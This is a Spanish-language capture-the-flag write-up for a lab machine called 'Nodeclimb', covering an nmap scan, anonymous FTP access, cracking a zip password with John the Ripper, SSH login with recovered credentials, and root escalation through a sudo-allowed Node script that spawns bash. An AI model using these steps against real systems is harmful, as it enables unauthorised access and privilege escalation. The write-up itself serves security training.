# Máquina Nodeclimb

- Nivel: fácil

## Escaneo de puertos

<p> Comenzamos por hacer un ping a la máquina víctima para confirmar que esta encendida </p>

```shell
ping -c 1 172.17.0.2

```

```shell

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.066 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.066/0.066/0.066/0.000 ms

```
<p>La máquina esta encendida y funciona correctamente.</p>

<p>Ahora procedemos al escaneo de puertos mediante nmap</p>

```shell
sudo nmap -p- --open -sS -sCV -vvv -n -Pn 172.17.0.2

```

```shell

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 21:46 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Initiating ARP Ping Scan at 21:46
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:46, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:46
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:46, 1.42s elapsed (65535 total ports)
Initiating Service scan at 21:46
Scanning 2 services on 172.17.0.2
Completed Service scan at 21:46, 0.02s elapsed (2 services on 1 host)
NSE: Script scanning 172.17.0.2.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:46
NSE: [ftp-bounce 172.17.0.2:21] PORT response: 500 Illegal PORT command.
Completed NSE at 21:46, 0.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000090s latency).
Scanned at 2025-02-11 21:46:39 CET for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIIJXdsH3BqdecsOrKH3q6AQI9zJxHexsJHT+Kam8R4WWmg8g0o7s75qwSx6YvfhFptiXDYcMT6hq7VNs4YnuUg=
|   256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIEGiHc4ywr2G/gO3ihoB+r77LxHnCWOkdfc3n0BiZLQ
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```
<p>El escaneo nos arroja un dato interesante, el puerto de ftp esta abierto y permite la identificación anónima</p>

## Busqueda por FTP

<p>Probamos a realizar un login anónimo</p>

```shell
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

```

<p>Buscamos a que archivos podemos acceder</p>

```shell
ftp> ls
229 Entering Extended Passive Mode (|||34125|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip

```
<p>Vemos una carpeta comprimida, vamos a descargarla para ver que contiene</p>

```shel
ftp> get secretitopicaron.zip

```
<p>Descompromimos la carpeta</p>

```shell

unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
password incorrect--reenter: 
   skipping: password.txt            incorrect password

```
<p>Nos muestra que el comprimido esta protegido por una contraseña.</p>

<p>Tratamos de acceder a él buscando la contraseña por fuerza bruta.</p>

```shell
zip2john secretitopicaron.zip > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

```shell
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2025-02-11 22:01) 5.000g/s 122880p/s 122880c/s 122880C/s 123456..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<p>Mediante la herramienta John the Ripper obtenemos que la contraseña del zip es "password1" por lo que provamos a descomprimirla de nuevo.</p>

```shell
unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
 extracting: password.txt
```

<p>Dentro del comprimodo se encuentra un archivo llamado "password.txt" con el siguiente contenido "mario:laKontraseñAmasmalotaHdelbarrioH"</p>

## Conexión por ssh

<p>Aprovechando estas credenciales nos tratamos de conectar por ssh</p>

```shell
ssh mario@172.17.0.2
```
<p>Tras esto ganamos acceso a la máquina como el usuario mario</p>

## Escalada de privilegios

<p>Buscamos privilegios que podamos explotar.</p>

```shell
sudo -l
```

```shell
Matching Defaults entries for mario on b508f6fb807e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on b508f6fb807e:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```
```shell
mario@b508f6fb807e:~$ ls -l
total 0
-rw-r--r-- 1 mario mario 0 Jul  5  2024 script.js

```
<p>Como podemos observar podemos ejecutar un archivo llamado script.js con node teniendo privilegios de root sin contraseña, además, tenemos permiso edición del archivo por lo que trataremos de llevar por aqui la escalada</p>

<p>Cargamos el siguiente script en script.js</p>

```java
const { spawn } = require("child_process");

spawn("/bin/bash", { stdio: "inherit" });

```
<p>Este script genera una shell mediante un proceso asíncrono y la redirige a nuestra salida.</p>

<p>Ejecutamos el programa como el usuario root.</p>

```shell
sudo -u root /usr/bin/node /home/mario/script.js
```
<p>Como podemos observar hemos obtenido una shell con una sesión del usuario root.</p>

```shell
root@b508f6fb807e:/home/mario# whoami
root

```
